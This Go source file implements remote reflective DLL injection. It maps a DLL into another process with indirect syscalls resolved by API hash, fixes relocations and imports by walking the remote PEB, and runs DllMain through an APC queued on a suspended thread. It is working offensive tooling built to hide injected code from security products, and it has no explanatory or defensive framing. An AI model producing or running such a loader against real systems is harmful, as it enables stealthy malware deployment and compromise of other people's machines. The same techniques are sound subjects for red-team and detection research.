package loader

import (
	"encoding/binary"
	"errors"
	"strings"
	"unicode/utf16"
	"unsafe"

	wc "github.com/carved4/go-wincall"
)

const (
	memCommit  = 0x00001000
	memReserve = 0x00002000
	pageRW     = 0x04
	pageR      = 0x02
	pageRX     = 0x20
	pageRWX    = 0x40
)

type processBasicInformation struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 uintptr
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessId uintptr
}

func LoadDLLRemote(hProcess uintptr, dllBytes []byte) error {
	if len(dllBytes) < 64 || dllBytes[0] != 'M' || dllBytes[1] != 'Z' {
		return errors.New("invalid PE")
	}

	peOffset := *(*uint32)(unsafe.Pointer(&dllBytes[60]))
	peHeaderAddr := uintptr(unsafe.Pointer(&dllBytes[peOffset]))
	optHeaderAddr := peHeaderAddr + 0x18
	sizeOfImage := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x38))
	sizeOfHeaders := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x3C))
	preferredBase := *(*uint64)(unsafe.Pointer(optHeaderAddr + 0x18))

	ntAlloc := wc.GetSyscall(wc.GetHash("NtAllocateVirtualMemory"))
	var remoteBase uintptr
	var regionSize uintptr = uintptr(sizeOfImage)

	ret, _ := wc.IndirectSyscall(ntAlloc.SSN, ntAlloc.Address,
		hProcess, uintptr(unsafe.Pointer(&remoteBase)), 0,
		uintptr(unsafe.Pointer(&regionSize)), memCommit|memReserve, pageRW)
	if ret != 0 || remoteBase == 0 {
		return errors.New("NtAllocateVirtualMemory failed")
	}

	ntWrite := wc.GetSyscall(wc.GetHash("NtWriteVirtualMemory"))
	var written uintptr
	ret, _ = wc.IndirectSyscall(ntWrite.SSN, ntWrite.Address,
		hProcess, remoteBase, uintptr(unsafe.Pointer(&dllBytes[0])),
		uintptr(sizeOfHeaders), uintptr(unsafe.Pointer(&written)))
	if ret != 0 {
		return errors.New("NtWriteVirtualMemory failed")
	}

	numSections := *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x06))
	sizeOfOptHeader := *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x14))

	for i := uint16(0); i < numSections; i++ {
		sectionHeader := uintptr(unsafe.Pointer(&dllBytes[0])) + uintptr(peOffset) + 0x18 + uintptr(sizeOfOptHeader) + uintptr(i*40)
		virtualAddress := *(*uint32)(unsafe.Pointer(sectionHeader + 0x0C))
		sizeOfRawData := *(*uint32)(unsafe.Pointer(sectionHeader + 0x10))
		pointerToRawData := *(*uint32)(unsafe.Pointer(sectionHeader + 0x14))

		if sizeOfRawData == 0 {
			continue
		}

		ret, _ = wc.IndirectSyscall(ntWrite.SSN, ntWrite.Address,
			hProcess, remoteBase+uintptr(virtualAddress),
			uintptr(unsafe.Pointer(&dllBytes[pointerToRawData])),
			uintptr(sizeOfRawData), uintptr(unsafe.Pointer(&written)))
		if ret != 0 {
			return errors.New("NtWriteVirtualMemory section failed")
		}
	}

	delta := int64(remoteBase) - int64(preferredBase)
	if delta != 0 {
		relocDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (5 * 8)))
		relocDirSize := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (5 * 8) + 4))
		if relocDirRVA != 0 && relocDirSize != 0 {
			processRelocations(hProcess, remoteBase, &dllBytes, relocDirRVA, relocDirSize, delta)
		}
	}

	importDirRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x70 + (1 * 8)))
	if importDirRVA != 0 {
		resolveImports(hProcess, remoteBase, &dllBytes, importDirRVA)
	}

	ntProt := wc.GetSyscall(wc.GetHash("NtProtectVirtualMemory"))
	for i := uint16(0); i < numSections; i++ {
		sectionHeader := uintptr(unsafe.Pointer(&dllBytes[0])) + uintptr(peOffset) + 0x18 + uintptr(sizeOfOptHeader) + uintptr(i*40)
		virtualSize := *(*uint32)(unsafe.Pointer(sectionHeader + 0x08))
		virtualAddress := *(*uint32)(unsafe.Pointer(sectionHeader + 0x0C))
		characteristics := *(*uint32)(unsafe.Pointer(sectionHeader + 0x24))

		if virtualSize == 0 {
			continue
		}

		var prot uint32 = pageR
		if (characteristics & 0x20000000) != 0 {
			if (characteristics & 0x80000000) != 0 {
				prot = pageRWX
			} else {
				prot = pageRX
			}
		} else if (characteristics & 0x80000000) != 0 {
			prot = pageRW
		}

		var oldProt uint32
		baseAddr := remoteBase + uintptr(virtualAddress)
		regionSz := uintptr(virtualSize)
		wc.IndirectSyscall(ntProt.SSN, ntProt.Address, hProcess,
			uintptr(unsafe.Pointer(&baseAddr)), uintptr(unsafe.Pointer(&regionSz)),
			uintptr(prot), uintptr(unsafe.Pointer(&oldProt)))
	}

	entryPointRVA := *(*uint32)(unsafe.Pointer(optHeaderAddr + 0x10))
	if entryPointRVA != 0 {
		callDllMain(hProcess, remoteBase, remoteBase+uintptr(entryPointRVA))
	}

	return nil
}

func processRelocations(hProcess uintptr, remoteBase uintptr, dllBytes *[]byte, relocDirRVA, relocDirSize uint32, delta int64) {
	ntRead := wc.GetSyscall(wc.GetHash("NtReadVirtualMemory"))
	ntWrite := wc.GetSyscall(wc.GetHash("NtWriteVirtualMemory"))

	localBase := uintptr(unsafe.Pointer(&(*dllBytes)[0]))
	relocOffset := rvaToOffset(dllBytes, relocDirRVA)
	relocDir := localBase + uintptr(relocOffset)
	relocEnd := relocDir + uintptr(relocDirSize)

	for relocDir < relocEnd {
		pageRVA := *(*uint32)(unsafe.Pointer(relocDir))
		blockSize := *(*uint32)(unsafe.Pointer(relocDir + 4))
		if blockSize == 0 || blockSize < 8 {
			break
		}

		entryCount := (blockSize - 8) / 2
		entries := relocDir + 8

		for i := uint32(0); i < entryCount; i++ {
			entry := *(*uint16)(unsafe.Pointer(entries + uintptr(i*2)))
			relocType := entry >> 12
			offset := entry & 0xFFF

			if relocType == 0 {
				continue
			}

			patchAddr := remoteBase + uintptr(pageRVA) + uintptr(offset)

			if relocType == 10 {
				var buf [8]byte
				var bytesRead uintptr
				ret, _ := wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
					hProcess, patchAddr, uintptr(unsafe.Pointer(&buf[0])), 8, uintptr(unsafe.Pointer(&bytesRead)))
				if ret != 0 {
					continue
				}
				oldValue := binary.LittleEndian.Uint64(buf[:])
				binary.LittleEndian.PutUint64(buf[:], uint64(int64(oldValue)+delta))
				var written uintptr
				wc.IndirectSyscall(ntWrite.SSN, ntWrite.Address,
					hProcess, patchAddr, uintptr(unsafe.Pointer(&buf[0])), 8, uintptr(unsafe.Pointer(&written)))
			} else if relocType == 3 {
				var buf [4]byte
				var bytesRead uintptr
				ret, _ := wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
					hProcess, patchAddr, uintptr(unsafe.Pointer(&buf[0])), 4, uintptr(unsafe.Pointer(&bytesRead)))
				if ret != 0 {
					continue
				}
				oldValue := binary.LittleEndian.Uint32(buf[:])
				binary.LittleEndian.PutUint32(buf[:], uint32(int32(oldValue)+int32(delta)))
				var written uintptr
				wc.IndirectSyscall(ntWrite.SSN, ntWrite.Address,
					hProcess, patchAddr, uintptr(unsafe.Pointer(&buf[0])), 4, uintptr(unsafe.Pointer(&written)))
			}
		}
		relocDir += uintptr(blockSize)
	}
}

func resolveImports(hProcess uintptr, remoteBase uintptr, dllBytes *[]byte, importDirRVA uint32) {
	ntWrite := wc.GetSyscall(wc.GetHash("NtWriteVirtualMemory"))
	localBase := uintptr(unsafe.Pointer(&(*dllBytes)[0]))
	importDescOffset := rvaToOffset(dllBytes, importDirRVA)
	importDesc := localBase + uintptr(importDescOffset)

	for {
		originalFirstThunk := *(*uint32)(unsafe.Pointer(importDesc + 0x00))
		nameRVA := *(*uint32)(unsafe.Pointer(importDesc + 0x0C))
		firstThunk := *(*uint32)(unsafe.Pointer(importDesc + 0x10))

		if nameRVA == 0 {
			break
		}

		nameOffset := rvaToOffset(dllBytes, nameRVA)
		dllName := cstringAt(localBase + uintptr(nameOffset))

		actualDllName := dllName
		if isApiSet(dllName) {
			if resolved := resolveApiSet(dllName); resolved != "" {
				actualDllName = resolved
			}
		}

		localModule := wc.LoadLibraryLdr(actualDllName)
		if localModule == 0 {
			importDesc += 20
			continue
		}

		remoteModule, _ := getRemoteModuleBase(hProcess, actualDllName)
		if remoteModule == 0 {
			importDesc += 20
			continue
		}

		thunkRVA := originalFirstThunk
		if thunkRVA == 0 {
			thunkRVA = firstThunk
		}

		thunkOffset := rvaToOffset(dllBytes, thunkRVA)
		thunkAddr := localBase + uintptr(thunkOffset)
		iatRemote := remoteBase + uintptr(firstThunk)

		for {
			thunkValue := *(*uint64)(unsafe.Pointer(thunkAddr))
			if thunkValue == 0 {
				break
			}

			var funcRVA uintptr
			if (thunkValue & 0x8000000000000000) != 0 {
				ordinal := uint16(thunkValue & 0xFFFF)
				var localFunc uintptr
				wc.Call("ntdll.dll", "LdrGetProcedureAddress", localModule, 0, uintptr(ordinal), uintptr(unsafe.Pointer(&localFunc)))
				if localFunc != 0 {
					funcRVA = localFunc - localModule
				}
			} else {
				importByNameOffset := rvaToOffset(dllBytes, uint32(thunkValue))
				funcName := cstringAt(localBase + uintptr(importByNameOffset) + 2)
				localFunc := wc.GetFunctionAddress(localModule, wc.GetHash(funcName))
				if localFunc != 0 {
					funcRVA = localFunc - localModule
				}
			}

			if funcRVA != 0 {
				var buf [8]byte
				binary.LittleEndian.PutUint64(buf[:], uint64(remoteModule+funcRVA))
				var written uintptr
				wc.IndirectSyscall(ntWrite.SSN, ntWrite.Address,
					hProcess, iatRemote, uintptr(unsafe.Pointer(&buf[0])), 8, uintptr(unsafe.Pointer(&written)))
			}

			thunkAddr += 8
			iatRemote += 8
		}
		importDesc += 20
	}
}

func callDllMain(hProcess uintptr, dllBase uintptr, entryPoint uintptr) {
	ntdll := wc.GetModuleBase(wc.GetHash("ntdll.dll"))
	rtlExitUserThread := wc.GetFunctionAddress(ntdll, wc.GetHash("RtlExitUserThread"))

	ntCreateThreadEx := wc.GetSyscall(wc.GetHash("NtCreateThreadEx"))
	var hThread uintptr
	wc.IndirectSyscall(ntCreateThreadEx.SSN, ntCreateThreadEx.Address,
		uintptr(unsafe.Pointer(&hThread)), 0x1FFFFF, 0, hProcess, rtlExitUserThread, 0, 1, 0, 0, 0, 0)

	if hThread == 0 {
		return
	}

	ntQueueApc := wc.GetSyscall(wc.GetHash("NtQueueApcThread"))
	wc.IndirectSyscall(ntQueueApc.SSN, ntQueueApc.Address,
		hThread, entryPoint, dllBase, 1, 0)

	ntResumeThread := wc.GetSyscall(wc.GetHash("NtResumeThread"))
	wc.IndirectSyscall(ntResumeThread.SSN, ntResumeThread.Address, hThread, 0)

	ntWait := wc.GetSyscall(wc.GetHash("NtWaitForSingleObject"))
	timeout := int64(-100000000) // 10 seconds
	wc.IndirectSyscall(ntWait.SSN, ntWait.Address, hThread, 0, uintptr(unsafe.Pointer(&timeout)))

	ntClose := wc.GetSyscall(wc.GetHash("NtClose"))
	wc.IndirectSyscall(ntClose.SSN, ntClose.Address, hThread)
}

func getRemoteModuleBase(hProcess uintptr, moduleName string) (uintptr, error) {
	ntQuery := wc.GetSyscall(wc.GetHash("NtQueryInformationProcess"))
	var pbi processBasicInformation
	var returnLength uint32
	ret, _ := wc.IndirectSyscall(ntQuery.SSN, ntQuery.Address,
		hProcess, 0, uintptr(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&returnLength)))
	if ret != 0 || pbi.PebBaseAddress == 0 {
		return 0, errors.New("failed to get PEB")
	}

	ntRead := wc.GetSyscall(wc.GetHash("NtReadVirtualMemory"))
	var ldrAddress uintptr
	wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
		hProcess, pbi.PebBaseAddress+0x18, uintptr(unsafe.Pointer(&ldrAddress)), 8, 0)

	if ldrAddress == 0 {
		return 0, errors.New("Ldr is null")
	}

	var listHead uintptr = ldrAddress + 0x10
	var currentEntry uintptr
	wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
		hProcess, listHead, uintptr(unsafe.Pointer(&currentEntry)), 8, 0)

	target := strings.ToLower(moduleName)

	for currentEntry != 0 && currentEntry != listHead {
		var dllBase uintptr
		wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
			hProcess, currentEntry+0x30, uintptr(unsafe.Pointer(&dllBase)), 8, 0)

		var baseDllNameLen uint16
		wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
			hProcess, currentEntry+0x58, uintptr(unsafe.Pointer(&baseDllNameLen)), 2, 0)

		var baseDllNamePtr uintptr
		wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
			hProcess, currentEntry+0x60, uintptr(unsafe.Pointer(&baseDllNamePtr)), 8, 0)

		if baseDllNameLen > 0 && baseDllNameLen < 512 && baseDllNamePtr != 0 {
			nameBuf := make([]uint16, baseDllNameLen/2)
			wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
				hProcess, baseDllNamePtr, uintptr(unsafe.Pointer(&nameBuf[0])), uintptr(baseDllNameLen), 0)

			name := strings.ToLower(strings.TrimRight(string(utf16.Decode(nameBuf)), "\x00"))
			if name == target {
				return dllBase, nil
			}
		}

		var nextEntry uintptr
		wc.IndirectSyscall(ntRead.SSN, ntRead.Address,
			hProcess, currentEntry, uintptr(unsafe.Pointer(&nextEntry)), 8, 0)

		if nextEntry == currentEntry || nextEntry == 0 {
			break
		}
		currentEntry = nextEntry
	}

	return 0, errors.New("module not found")
}

var cachedApiSetMap uintptr

func getApiSetMap() uintptr {
	if cachedApiSetMap != 0 {
		return cachedApiSetMap
	}
	ntQuery := wc.GetSyscall(wc.GetHash("NtQueryInformationProcess"))
	var pbi processBasicInformation
	var returnLength uint32
	currentProcess := ^uintptr(0)
	ret, _ := wc.IndirectSyscall(ntQuery.SSN, ntQuery.Address,
		currentProcess, 0, uintptr(unsafe.Pointer(&pbi)), unsafe.Sizeof(pbi), uintptr(unsafe.Pointer(&returnLength)))
	if ret != 0 || pbi.PebBaseAddress == 0 {
		return 0
	}
	cachedApiSetMap = *(*uintptr)(unsafe.Pointer(pbi.PebBaseAddress + 0x68))
	return cachedApiSetMap
}

func resolveApiSet(name string) string {
	apiSetMap := getApiSetMap()
	if apiSetMap == 0 {
		return ""
	}

	version := *(*uint32)(unsafe.Pointer(apiSetMap))
	if version != 6 {
		return ""
	}

	count := *(*uint32)(unsafe.Pointer(apiSetMap + 0x0C))
	entryOffset := *(*uint32)(unsafe.Pointer(apiSetMap + 0x10))
	hashOffset := *(*uint32)(unsafe.Pointer(apiSetMap + 0x14))
	hashFactor := *(*uint32)(unsafe.Pointer(apiSetMap + 0x18))

	if count == 0 {
		return ""
	}

	lookup := strings.ToLower(name)
	if strings.HasSuffix(lookup, ".dll") {
		lookup = lookup[:len(lookup)-4]
	}
	dashIdx := strings.LastIndex(lookup, "-")
	if dashIdx < 0 {
		return ""
	}
	lookup = lookup[:dashIdx]

	var hash uint32
	for _, c := range lookup {
		hash = hash*hashFactor + uint32(c)
	}

	hashTable := apiSetMap + uintptr(hashOffset)
	low := int32(0)
	high := int32(count) - 1
	foundIdx := int32(-1)

	for low <= high {
		mid := (low + high) / 2
		entryHash := *(*uint32)(unsafe.Pointer(hashTable + uintptr(mid*8)))
		if hash < entryHash {
			high = mid - 1
		} else if hash > entryHash {
			low = mid + 1
		} else {
			foundIdx = int32(*(*uint32)(unsafe.Pointer(hashTable + uintptr(mid*8) + 4)))
			break
		}
	}

	if foundIdx < 0 {
		return ""
	}

	nsEntry := apiSetMap + uintptr(entryOffset) + uintptr(foundIdx)*24
	hashedLen := *(*uint32)(unsafe.Pointer(nsEntry + 0x0C))
	valueOff := *(*uint32)(unsafe.Pointer(nsEntry + 0x10))
	valueCount := *(*uint32)(unsafe.Pointer(nsEntry + 0x14))

	entryName := wideStringAt(apiSetMap+uintptr(*(*uint32)(unsafe.Pointer(nsEntry + 0x04))), hashedLen)
	if !strings.EqualFold(lookup, entryName) {
		return ""
	}

	if valueCount == 0 {
		return ""
	}

	valEntry := apiSetMap + uintptr(valueOff)
	resolvedOff := *(*uint32)(unsafe.Pointer(valEntry + 0x0C))
	resolvedLen := *(*uint32)(unsafe.Pointer(valEntry + 0x10))
	if resolvedLen == 0 {
		return ""
	}

	return wideStringAt(apiSetMap+uintptr(resolvedOff), resolvedLen)
}

func wideStringAt(addr uintptr, byteLen uint32) string {
	if byteLen == 0 {
		return ""
	}
	charCount := byteLen / 2
	u16 := make([]uint16, charCount)
	for i := uint32(0); i < charCount; i++ {
		u16[i] = *(*uint16)(unsafe.Pointer(addr + uintptr(i*2)))
	}
	return string(utf16.Decode(u16))
}

func isApiSet(name string) bool {
	n := strings.ToLower(name)
	return strings.HasPrefix(n, "api-ms-") || strings.HasPrefix(n, "ext-ms-")
}

func cstringAt(addr uintptr) string {
	var bs []byte
	for i := uintptr(0); ; i++ {
		b := *(*byte)(unsafe.Pointer(addr + i))
		if b == 0 {
			break
		}
		bs = append(bs, b)
	}
	return string(bs)
}

func rvaToOffset(dllBytes *[]byte, rva uint32) uint32 {
	localBase := uintptr(unsafe.Pointer(&(*dllBytes)[0]))
	peOffset := *(*uint32)(unsafe.Pointer(localBase + 60))
	peHeaderAddr := localBase + uintptr(peOffset)
	numSections := *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x06))
	sizeOfOptHeader := *(*uint16)(unsafe.Pointer(peHeaderAddr + 0x14))
	sectionHeaderAddr := peHeaderAddr + 0x18 + uintptr(sizeOfOptHeader)

	for i := uint16(0); i < numSections; i++ {
		sectionHeader := sectionHeaderAddr + uintptr(i*40)
		virtualSize := *(*uint32)(unsafe.Pointer(sectionHeader + 0x08))
		virtualAddress := *(*uint32)(unsafe.Pointer(sectionHeader + 0x0C))
		pointerToRawData := *(*uint32)(unsafe.Pointer(sectionHeader + 0x14))

		if rva >= virtualAddress && rva < virtualAddress+virtualSize {
			return pointerToRawData + (rva - virtualAddress)
		}
	}
	return rva
}
